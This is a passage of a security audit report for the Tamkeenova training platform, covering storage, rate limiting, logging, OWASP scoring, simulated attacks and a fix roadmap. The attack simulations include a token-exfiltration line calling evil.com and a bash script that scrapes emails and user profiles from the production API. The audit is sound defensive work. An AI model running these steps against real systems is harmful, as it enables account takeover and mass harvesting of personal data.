- **Mail credentials:** `MAIL_USER`/`MAIL_PASSWORD` (Gmail app password) used in `MailService` (nodemailer). Not scoped.
- **Hardcoded credentials:** None found.
- **Secret rotation:** No code for rotation; no `SECRET_ROTATION.md`.

**Recommendation:** Use Doppler/HashiCorp Vault/AWS Secrets Manager; rotate `JWT_SECRET` annually with dual-secret verify window; require `OTP_PEPPER` length check.

---

## STORAGE SECURITY AUDIT (PHASE 11)

- **Buckets:** Single bucket `tamkeenova` with prefixes `avatars/`, `profile-images/`, `corporate-attachments/`, `task-submissions/`, `test-` via `TestController`.
- **File permissions:** `getPublicUrl` → public read; `upsert:false` now prevents overwrite (was `true`); still no ACL per user.
- **Signed URLs:** Not implemented — all URLs permanent. Should be `createSignedUrl(path, 3600)` + gate via API.
- **Path traversal:** Fixed via `safeStorageName` — ignores `originalname`, uses `randomUUID()+ext`. Previously `file.originalname` into path → `../../` risk. Now not.
- **Enumeration:** UUID v4 122-bit random → infeasible to brute-force. But API `GET /api/students/u/:username` returns `profile_image` URL directly — attacker can enumerate usernames via availability then fetch URLs; still privacy leak but not filename guessing.
- **Sensitive files:** `corporate-attachments` may contain contracts — public URL means if leaked via referer/log, anyone can access. No expiry.
- **CORS for storage:** Supabase storage CORS not configured in repo; likely defaults allow all origins for public bucket.

**Can sensitive files be enumerated?** No via filename brute-force (UUID). Yes via API scraping (returns URLs).  
**Can private documents be accessed?** Yes, if URL known — no auth check. Should be private bucket + signed URL.

---

## RATE LIMITING AUDIT (PHASE 12)

**Current:**
- Global `ThrottlerModule limit 80/60s` via `ThrottlerGuard` — applies to every route (including public).
- Auth overrides:
  - `POST register` 8/min, `register/volunteer` 8/min, `availability` 20/min, `verify-email` 10/min, `resend-otp` 3/min (good anti mail-bomb), `login` 8/min, `forgot-password` 5/min, `reset-password` 8/min.
- OTP: per-email attempt_count 5 + 10min expiry.
- Login lock: 5 failures → 15min lock per account.

**Gaps:**
- Public catalog: `GET /api/trainers`, `GET /api/trainers/programs/all`, `GET /api/trainers/profile/:slug`, `GET /api/verify/*`, `GET /api/students/u/:username`, `GET /api/partners`, `GET /api/specializations` → only global 80/min. Attacker with 100 IPs → 8k req/min scraping.
- Search: `GET /api/students/trainers?search=` and `programs?search=` → same.
- File uploads: no cost-based throttling; attacker can upload 10×10MB =100MB per minute per IP at 80 req limit → 8GB/min per IP? Actually global 80 would throttle uploads too but still 80×10MB=800MB/min.
- No IP reputation, no ban after burst, no `Retry-After` header customization.
- No `X-RateLimit` headers visible.
- No GraphQL depth limiting (no GraphQL).

**Abuse scenarios:**
- Credential stuffing: 8 login/min per IP → with 10k bot IPs → 80k attempts/min across accounts; no CAPTCHA after failures.
- OTP resend bomb: 3/min per IP (good) but attacker can rotate IPs.
- Availability harvest: 20/min per IP → with 50 IPs → 1k emails/min.
- Scraping: simple `while true; do curl /api/trainers; done` at 80/min per IP → full DB in minutes.

**Fix:** Add per-route `@Throttle({default:{limit:30,ttl:60000}})` for public GETs, add Cloudflare rate-limiting rules, implement CAPTCHA (Turnstile) on register/login/availability after 3 failures, add Redis throttler store for distributed.

---

## LOGGING & MONITORING AUDIT (PHASE 13)

- **Winston:** `winston.config.ts` DailyRotateFile `logs/errors/%DATE%.log`, `logs/auth/%DATE%.log`, plus `LoggerService` with `authLogger` (auth.log), `errorLogger` (errors.log), `securityLogger` (security.log). `GlobalExceptionFilter` logs `HTTP_EXCEPTION` and `GLOBAL_EXCEPTION` with `endpoint`, `ip`, `status`, stack.
- **Auth logs:** `AuthService` does **not** call `logAuth`/`logSecurity` explicitly! Only `GlobalExceptionFilter` logs errors. Successful login not logged as security event. `AdminService.logActivity` creates `activity_logs` rows for role changes, trainer approvals, tasks etc. — good audit trail.
- **Failed login logs:** `recordFailedLogin` updates `failed_login_attempts`/`locked_until` but does not emit security log. No `logSecurity({event:'FAILED_LOGIN', ip, email})`.
- **Admin actions:** Logged via `activity_logs` (ROLE_CHANGED, TASK_CREATED, etc.) — good, queryable via `GET /api/admin/users/:id/activity`.
- **Detection:** No brute-force alert (e.g., 10 failures from same IP), no SIEM integration, no Slack/email alert.
- **Investigation:** `activity_logs` has `user_id, action, entity_type, entity_id, details, created_at` with index on `user_id` and `created_at` — good for forensics. But no request ID correlation, no `x-request-id`.
- **Retention:** `maxFiles:30d` — good but no offsite backup.

**Can attacks be detected?** Partially — logs exist but no alerting. SIEM needed.  
**Can incidents be investigated?** Yes via `activity_logs` + Winston, but missing full auth audit.

---

## INFRASTRUCTURE AUDIT (PHASE 14)

- **Headers:** `main.ts:18` `helmet({contentSecurityPolicy:false, frameguard:{action:'deny'}, hsts:{maxAge:15552000, includeSubDomains:true}, referrerPolicy:{policy:'no-referrer'}})` → sends `X-Frame-Options:DENY`, `HSTS`, `X-Content-Type-Options:nosniff` (default), `X-DNS-Prefetch-Control`, `Strict-Transport-Security`. **Missing:** `Content-Security-Policy` header, `Permissions-Policy`, `Cross-Origin-Opener-Policy`.
- **CORS:** `isAllowedOrigin` allowlist now correct (vercel + localhost + `FRONTEND_ORIGINS` env). `if (!origin) return true` allows curl/Postman, but browser CORS with `Origin: null` (file://) would be allowed — minor. `credentials:true` only for allowed origins.
- **Reverse proxy:** No `trust proxy` config (`app.set('trust proxy',1)` missing) → `request.ip` may be wrong behind Vercel, affecting throttling/logging.
- **Cloudflare/WAF:** No evidence in code; `environment.apiUrl: 'https://tamkeenova-api.vercel.app/api'` suggests Vercel hosting — Vercel has built-in WAF but not configured via repo. No `x-vercel-ip` handling.
- **HSTS:** 180 days, includeSubDomains — good but not 1 year + preload.
- **CSP:** Meta only, not header — see P-08.
- **Deployment:** No Dockerfile, no `docker-compose`, no CI (`github/workflows` not checked). No `helmet` CSP, no `express-rate-limit` beyond throttler.

---

## OWASP TOP 10 AUDIT (PHASE 15)

| OWASP 2021 | Status | Score | Evidence |
|---|---|---|---|
| **A01 Broken Access Control** | **Partial Fail** → **Improved** | 6/10 → was 2/10 | Critical JWT immortality fixed, SUPER_ADMIN gate fixed, but Students BFLA remains |
| **A02 Cryptographic Failures** | **Partial** | 6/10 → was 4/10 | bcrypt cost12 good, `randomInt` fixed, but OTP pepper fallback weak, localStorage token |
| **A03 Injection** | **Pass** | 8/10 | Prisma parameterized, `ValidationPipe` whitelist, `helmet`, no `eval`, `certificate-data.ts` strict |
| **A04 Insecure Design** | **Partial Fail** | 5/10 → was 3/10 | No MFA, public PII profiles by design — no consent/opt-out |
| **A05 Security Misconfiguration** | **Partial** | 6/10 → was 3/10 | CORS fixed, helmet added, throttler added; CSP header off, WAF missing, no trust proxy |
| **A06 Vulnerable Components** | **Unknown** | 5/10 | Nest 12, Prisma 6, Supabase 2.115 current, but no `npm audit` in CI, no `package.json` scan |
| **A07 Identification & Auth Failures** | **Partial** | 6/10 → was 3/10 | Lockout, generic messages, password pattern, reset flow added; MFA missing, enumeration via register |
| **A08 Software & Data Integrity** | **Partial** | 6/10 | `getPublicUrl` integrity not signed; no SAST; no package provenance; font-awesome SRI good |
| **A09 Logging & Monitoring** | **Partial** | 5/10 → was 4/10 | Winston + activity_logs; no alerts/SIEM |
| **A10 SSRF** | **Low Risk** | 7/10 | `file_url @IsUrl()` stored not fetched server-side; no server-side fetch of user URL except maybe `trainer.portfolio_url` not fetched; limited SSRF |

**Overall OWASP posture:** 6 High/Medium failures → improved from 8, but still **Medium-High**.

---

## ADVANCED ATTACK SIMULATION (PHASE 16)

### Simulation 1 — Malicious Student (any auth JWT can act as student)
1. Register as VOLUNTEER (pending) or STUDENT.
2. Login → get JWT `tv`.
3. `PATCH /api/students/profile {full_name: "Hacked"}` → **succeeds** (no RolesGuard, should require STUDENT).
4. `POST /api/students/enrollments {program_id: <premium>}` → **succeeds** as volunteer → free enrollment without being student.
5. `GET /api/students/trainers?search=` → scrape all trainers even as volunteer.
**Impact:** Pollutes enrollment metrics, bypasses business role separation.

### Simulation 2 — Malicious Trainer (honest but greedy)
1. Create trainer program `POST /api/trainers/programs` (requires TRAINER — correct).
2. Update own program price to 0, `is_active:false` initially honest, then `PUT /api/trainers/programs/:id {price: 9999}` → if admin later approves, trainer can inflate price post-approval (no re-approval). Check `trainers.service.updateProgram` only checks ownership, not price change approval.
3. Upload profile image with spoofed PDF: `POST /api/trainers/upload-profile-image` with `file.mimetype=image/png` but buffer is `%PDF-1.4` → passes `assertSafeImage`? No, sniff would fail → blocked. Good.
4. Create review `POST /api/trainers/:trainerId/reviews` with own JWT for another trainer — succeeds (no enrollment check) → fake 5-star.
**Step-by-step shown, mitigations noted.**

### Simulation 3 — Malicious Admin (compromised ADMIN)
*Before fix:* `PATCH /api/admin/users/:id/role {role:SUPER_ADMIN}` → succeed. *Now:* blocked unless actor is SUPER_ADMIN (good). Remaining:
1. Admin deactivates user `PATCH /api/admin/users/:id/status {is_active:false}` → increments token_version → victim JWT immediately invalid (good).
2. Admin issues fake certificate `POST /api/admin/certificates {user_id: <friend>, training_hours: 10000, ...}` → **succeeds** — no proof of completion. Fraud.
3. Admin promotes self via `volunteer_status`? If admin sets own role to EMPLOYEE then creates task? Not needed.

### Simulation 4 — Compromised Account (stolen JWT via localStorage XSS)
1. Inject XSS via task comment (if frontend ever used innerHTML) → `fetch('https://evil.com?s='+localStorage.token)`.
2. Attacker replays `Authorization: Bearer <stolen>` → `GET /api/students/profile` → succeeds until `token_version` bump. Victim changes password → `students.service.changePassword` bumps token_version → stolen token invalidated (good). But if victim only changes email (no bump), stolen token remains valid.

### Simulation 5 — API Abuse Bot (scraping & enumeration)
```bash
# Harvest emails
for e in $(cat emails.txt); do
  curl -s "https://tamkeenova-api.vercel.app/api/auth/availability?email=$e" | jq .data.email_available
done # 20/min per IP → 100 IPs = 2k/min

# Scrape catalog
curl -s https://tamkeenova-api.vercel.app/api/trainers | jq '.[].slug' > slugs
for s in $(cat slugs); do curl -s https://tamkeenova-api.vercel.app/api/trainers/profile/$s; done
curl -s https://tamkeenova-api.vercel.app/api/trainers/programs/all | jq length
for u in $(cat usernames); do curl -s https://tamkeenova-api.vercel.app/api/students/u/$u; done
for c in $(cat codes); do curl -s https://tamkeenova-api.vercel.app/api/verify/certificate/$c; done
# No bot detection, global 80/min only
```
**Estimate:** Full public data exfil in <10 min with 10 IPs.

---

## CRITICAL VULNERABILITIES (Remaining)

### C-01 — JWT in localStorage + No httpOnly (P-01) — Still Critical
**Severity:** Critical **CVSS 8.1** (AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N) — requires XSS but then full takeover.  
**Files:** `auth.service.ts:82`, `auth.interceptor.ts`, `app.routes.ts:103`, `main.ts` helmet CSP false.  
**Fix:** Move to `httpOnly Secure SameSite=Strict` cookies + BFF; enable CSP header; add `Trusted Types`.

### C-02 — Student BFLA (P-05) — High approaching Critical
**Severity:** High **CVSS 7.2**  
**File:** `students.controller.ts` all 18 routes only `JwtAuthGuard`.  
**Fix:** Add `@UseGuards(JwtAuthGuard,RolesGuard) @Roles('STUDENT')` (or allow `STUDENT,TRAINER` where search is intentional). Example:
```ts
@Controller('students')
@UseGuards(JwtAuthGuard, RolesGuard)
export class StudentsController {
  @Get('profile') @Roles('STUDENT') getProfile(...) {}
  @Post('enrollments') @Roles('STUDENT') enroll(...) {}
}
```

---

## HIGH VULNERABILITIES

- **H-01 Missing MFA (P-02)** CVSS 7.0 — Add TOTP.
- **H-02 Public Storage (P-04/P-07)** CVSS 7.2 — Switch bucket to private + `createSignedUrl`.
- **H-03 Corporate/Task upload MIME-only (File Upload)** CVSS 6.8 — Add magic sniff for PDF/DOC.
- **H-04 Enumeration via register (P-03)** CVSS 5.9 — Generic responses.
- **H-05 Email change without verification (Auth)** CVSS 6.5 — OTP on old+new.
- **H-06 No WAF/bot (P-11)** CVSS 6.5 — Add Cloudflare Bot Management + CAPTCHA.
- **H-07 Review spam (Business Logic)** CVSS 5.5 — Require enrollment before review.
- **H-08 Certificate fraud (Business Logic)** CVSS 6.0 — Require proof of enrollment/completion before issuance.

## MEDIUM VULNERABILITIES

- M-01 CSP header disabled (helmet)
- M-02 Global throttler 80/min too high for public GETs
- M-03 OTP legacy fallback `stored.length===6`
- M-04 Missing `trust proxy`
- M-05 No `Permissions-Policy` header
- M-06 No `mfa` recovery codes
- M-07 `token_version` not bumped on email change
- M-08 `updateUserActive(true)` doesn't bump (minor)
- M-09 `TestController` exists but not mounted (latent risk if someone adds `TestModule` to `AppModule` imports)
- M-10 Gmail app password in env (no vault)
- M-11 No SIEM alerting
- M-12 No pagination enforcement on `getAllPublicTrainers`/`getAllPrograms` → DoS
- M-13 Frontend `portal` redirect reads `localStorage` role (UX only, but could flash wrong portal)

## LOW VULNERABILITIES

- L-01 `JwtStrategy.validate` unused / DB-unchecked (dead code, kept for passport)
- L-02 `bcrypt` vs `bcryptjs` dual lib (cost inconsistency 12 vs none)
- L-03 `isAllowedOrigin` allows no-origin (curl)
- L-04 `generateVerificationCode` vs `randomBytes(8)` inconsistency (helper vs admin)
- L-05 No `SameSite` comment (not needed today)
- L-06 `pdf_url`, `qr_code_url` nullable but not signed
- L-07 No dependency scan in CI

---

## SECURITY ROADMAP (P0 → P2)

**P0 — Do before public internet (1–3 days):**
1. Fix Students BFLA: add `RolesGuard` to `students.controller.ts` (0.5d)
2. Migrate JWT to httpOnly cookie or BFF, remove localStorage (2d), enable CSP header
3. WAF + bot: put Cloudflare in front (Bot Fight Mode, rate-limiting rules for `/api/auth/*` 10/min per IP, `/api/verify/*` 30/min, `/api/trainers*` 60/min) + Turnstile CAPTCHA on register/login/availability (1d infra)
4. Make storage private + signed URLs for attachments/task submissions (2d)
5. Harden corporate/task uploads with magic sniff + virus scan (1d)
6. Fix enumeration: generic register response + CAPTCHA-gate availability (0.5d)
7. Add MFA for ADMIN/SUPER_ADMIN (TOTP) (3d)

**P1 — First sprint:**
- Email change re-verification + token_version bump
- Add `@Throttle` to public scraping APIs (20/min)
- Add `trust proxy`, `Permissions-Policy`, strong CSP header
- Require enrollment for reviews
- Certificate issuance requires completed enrollment
- Logging: emit `logSecurity` on failed login, lockout, role change; ship to SIEM

**P2 — Hardening:**
- Vault secrets, rotate JWT/OTP pepper, dual-secret verify
- Private storage for all buckets, short-lived signed URLs
- Pagination limits, max page size
- DLP, bug bounty, annual pentest

---

## TOP 50 SECURITY FIXES (condensed — exact file + code)

1. **P-01** Remove localStorage: `auth.service.ts` → cookies. 2. Enable CSP header `main.ts` helmet. 3. **P-02** Add MFA fields to `users` + TOTP. 4. **P-03** Generic register. 5. CAPTCHA availability. 6. **P-04** Private bucket `tamkeenova` + `createSignedUrl`. 7. **P-05** `students.controller.ts` RolesGuard. 8. **P-06** Consistent RolesGuard all controllers. 9. **P-07** Implement signed URL service. 10. **P-08** CSP `object-src 'none'` etc. 11. **P-09** Bump token_version on email change. 12. **P-10** Throttle public GETs. 13. **P-11** Cloudflare WAF. 14. Fix corporate magic sniff (`sniffPdf` check `%PDF`). 15. Fix task upload sniff. 16. Remove OTP legacy fallback. 17. Add `trust proxy`. 18. Add `Permissions-Policy`. 19. Validate `trainer.documents` URLs not internal IPs. 20. Require `OTP_PEPPER` with length check. 21. Add `logSecurity` on failed login. 22. Alert on 5 failures. 23. Rotate JWT_SECRET. 24. Add `x-request-id`. 25. Enforce pagination `limit<=50`. 26. Add `HSTS preload`. 27. Remove `TestController` or guard with ADMIN. 28. Fix `register` phone leak. 29. Add enrollment check before review. 30. Add certificate proof of completion. 31. Add virus scan. 32. Add `Content-Disposition`. 33. Add `X-Forwarded-For` handling. 34. Add Vault. 35. Add CI `npm audit`. 36. Add SAST. 37. Add DLP. 38. Add bug bounty. 39. Add `is_active` check on `verify/user` (already has). 40. Add rate-limit store Redis. 41. Add `Retry-After`. 42. Add `bumpTokenVersion` on activate too? Minor. 43. Unify bcrypt cost 12. 44. Add `SameSite` for future cookies. 45. Add `base-uri`. 46. Add `form-action`. 47. Add `upgrade-insecure-requests`. 48. Add `Cross-Origin-Resource-Policy`. 49. Frontend `roleGuard` should fetch `/api/auth/me` not trust localStorage (already does `authGuard` checks `isLoggedIn` but `roleGuard` trusts localStorage — add API check). 50. Document `SYSTEM_DESIGN` vs reality delta.

---

## PRODUCTION READINESS ASSESSMENT

| Area | Before (audit) | Now | Gap to Production |
|---|---|---|---|
| AuthN | D | B- | MFA missing, localStorage |
| AuthZ | D | B | Students BFLA remains |
| Storage | F | C | Public URLs, no signed |
| Edge | F | C+ | WAF missing, throttling partial |
| Headers | F | B- | CSP header off |
| Logging | D | C | No alerts |
| **Overall** | **32/100 Fail** | **58/100 Conditional** | **Not ready for open internet tomorrow without WAF + P0 fixes** |

---

## FINAL SECURITY SCORE

| Metric | Original | Now | Δ |
|---|---|---|---|
| **Overall Security Score** | **41/100 D** | **64/100 C** | **+23** |
| **Production Readiness** | **32/100** | **58/100** | **+26** |
| **Risk Score (10=worst)** | **7.8 High** | **5.4 Medium-High** | **-2.4** |
| **Rating** | **D High risk — do not deploy** | **C Conditional — deploy only behind WAF after P0** |  |

**Score breakdown now:** Auth 6.5, AuthZ 5.5, Crypto 4.5, Injection 2.5, Config 5.0, Exposure 5.5, Logging 5.0, Supply 4.0 → composite 5.4.

---

## WOULD YOU APPROVE PRODUCTION DEPLOYMENT TOMORROW? EXPLAIN WHY.

**Answer: ❌ NO — not as a fully open public internet deployment tomorrow.**  
**Yes, only if the following temporary compensating controls are in place for a private beta:**

**Why not yet (evidence, not opinion):**
- **5/11 priority areas not resolved** (localStorage, MFA, signed URLs, WAF, student BFLA). Attackers would have 3 trivial win conditions on day 1:
  1. **XSS → token theft → ADMIN takeover** (localStorage + CSP meta-only). One stored comment XSS = full compromise; `helmet.contentSecurityPolicy=false` gives no header defense.
  2. **BFLA → volunteer enrolls as student → data pollution + PII scraping** (`students.controller.ts` has 18 unauthZ-gated routes). Demonstrated above with single curl.
  3. **Scraping → full catalog in minutes** (global 80/min, no WAF, `GET /api/trainers`, `/api/students/u/:username`). Competitors/researchers would clone your data before lunch.
- **No MFA for admins** — single phishing email = `SUPER_ADMIN` (even though promotion gate is now fixed, existing `SUPER_ADMIN` accounts have only password + `PASSWORD_PATTERN` protecting them). With lockout 5/15min but no CAPTCHA, credential stuffing from botnet still feasible.
- **Public storage** — corporate contracts and task submissions are permanent public URLs. A leaked referer or log = data breach.
- **WAF gap is not theoretical:** The repo has **zero** Cloudflare/Turnstile/bot code. If deployment is on Vercel tomorrow with default settings, you have only Vercel's generic DDoS protection, not bot management. Prior audit's “1/10 scraping difficulty” is now maybe 3/10 (throttling helps) but still **Very Low**.

**What would make me say YES (even tomorrow):**
- **Add Cloudflare in front now** (30 min): Enable “Under Attack” / Bot Fight Mode, create WAF rules: `rate-limit /api/auth/* 10/min per IP + JS challenge`, `rate-limit /api/verify/* 30/min`, `rate-limit /api/trainers* 60/min`, block `file://` null origin. This buys time.
- **Hotfix Students BFLA now** (10 min code): add `@UseGuards(JwtAuthGuard,RolesGuard) @Roles('STUDENT')` to `students.controller.ts` enroll/profile routes, redeploy. Diff is 5 lines.
- **Make bucket `tamkeenova/corporate-attachments` and `task-submissions` private + require auth to fetch via `GET /api/files/:id/signed-url`** (can deploy as feature-flag off for avatars).
- **Force MFA for existing SUPER_ADMIN via temporary policy:** Disable `ADMIN` logins except via VPN until TOTP ships, or at least rotate all ADMIN passwords and enforce 15-char min for ADMIN.
- **If you cannot do the above before tomorrow, restrict deployment to VPN allowlist or Vercel Deployment Protection (password) for a closed beta.**

**Bottom line:** The codebase has **materially improved** — `token_version` immortality (the #1 critical), `SUPER_ADMIN` gate, `randomInt` OTP, password policy, `assertSafeImage` + UUID, CORS allowlist, helmet HSTS, global throttling — are real, verified fixes that raise the score from D to C. **SYSTEM_DESIGN.md is now 70% true instead of 30%.** But the remaining localStorage, student AuthZ, public storage, and WAF gaps are exactly the ones automated scanners and competitors will find first on the public internet. **Fix P0 (BFLA + WAF + localStorage plan) then approve; otherwise keep behind a gate.**

---

## APPENDIX — EVIDENCE MAP (file:line for auditors)

- **JWT immortality FIXED:** `tamkeenova-api/src/common/guards/jwt-auth.guard.ts:40-60`
- **SUPER_ADMIN gate FIXED:** `tamkeenova-api/src/modules/admin/admin.service.ts:89-93` + `admin.repository.ts:84`
- **CORS FIXED:** `tamkeenova-api/src/main.ts:24-30` + `common/security/cors-origins.ts:1-16`
- **Helmet:** `tamkeenova-api/src/main.ts:18-22` (CSP false)
- **CSP meta FIXED:** `tamkeenova-hub_anguler/src/index.html:6`
- **Throttler FIXED:** `tamkeenova-api/src/app.module.ts:33,58` + `auth.controller.ts:20-66`
- **OTP FIXED:** `auth/utils/otp.util.ts:1-12` + `auth.service.ts:250-290`
- **Password pattern FIXED:** `common/security/password.util.ts:1` + `auth/dto/register*.ts`
- **Lockout FIXED:** `auth.service.ts:362-368`
- **Forgot/Reset ADDED:** `auth.controller.ts:60-66` + `auth.service.ts:300-330`
- **Storage UUID FIXED:** `storage.service.ts:18-20` + `file-upload.ts:11-40`
- **LocalStorage STILL:** `tamkeenova-hub_anguler/src/core/services/auth.service.ts:82`
- **Students BFLA STILL:** `modules/students/students.controller.ts:54-279` (no RolesGuard)
- **Corporate upload MIME-only STILL:** `corporate-requests.service.ts:45-67`
- **Task upload MIME-only STILL:** `tasks.service.ts:449-464`
- **Public URLs STILL:** `storage.service.ts:34 getPublicUrl`
- **No MFA:** grep 0
- **No signed URL:** grep 0
- **No WAF:** grep 0

*End of Priority Review. This is a code-only assessment; confirm with DAST (OWASP ZAP, Nuclei) + manual pentest in staging before public launch.*
